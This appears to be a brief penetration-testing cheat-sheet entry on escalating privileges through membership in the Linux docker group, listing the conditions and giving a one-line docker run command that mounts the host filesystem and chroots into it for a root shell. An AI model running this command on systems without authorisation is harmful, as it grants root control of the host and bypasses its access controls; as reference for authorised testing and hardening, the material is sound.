# Privilege Escalation Method - Docker Group Abuse

## Vulnerability  
The vulnerability stems from a user being a member of the `docker` group, which allows interaction with the Docker daemon that runs as root, which results in root equivalent access.

## Conditions
- Docker installed and running on the target system  
- Compromised user is a member of the `docker` group  
- An operating system image available on the target machine  

## Exploitation and Key Commands
```bash
docker run --rm -it -v /:/mnt alpine chroot /mnt /bin/sh
```
A root shell on the host system is obtained.
